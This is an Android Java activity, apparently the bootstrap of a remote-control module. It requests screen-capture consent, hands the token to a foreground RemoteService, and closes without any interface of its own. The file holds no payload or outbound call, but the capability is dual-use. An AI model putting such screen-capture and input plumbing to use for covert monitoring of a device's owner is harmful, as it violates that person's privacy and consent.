package com.phantom.remote;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

/**
 * Bootstrap activity: requests the Android-only grants the remote module
 * needs (screen-capture consent), then hands the projection token to
 * {@link RemoteService} and finishes.
 *
 * The activity has no UI beyond the system consent dialog, so the operator's
 * "one click" is the platform prompt itself. Without consent the module still
 * runs in telemetry/input-only mode.
 */
public class MainActivity extends Activity {

    private static final int REQ_PROJECTION = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MediaProjectionManager mpm =
                (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJECTION);
        } else {
            startRemote(0, null);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_PROJECTION && resultCode == RESULT_OK && data != null) {
            startRemote(resultCode, data);
        } else {
            startRemote(0, null);   // no projection -> telemetry/input only
        }
    }

    private void startRemote(int resultCode, Intent data) {
        Intent svc = new Intent(this, RemoteService.class);
        if (data != null) {
            svc.putExtra("resultCode", resultCode);
            svc.putExtra("data", data);
        }
        startForegroundService(svc);
        finish();
    }
}
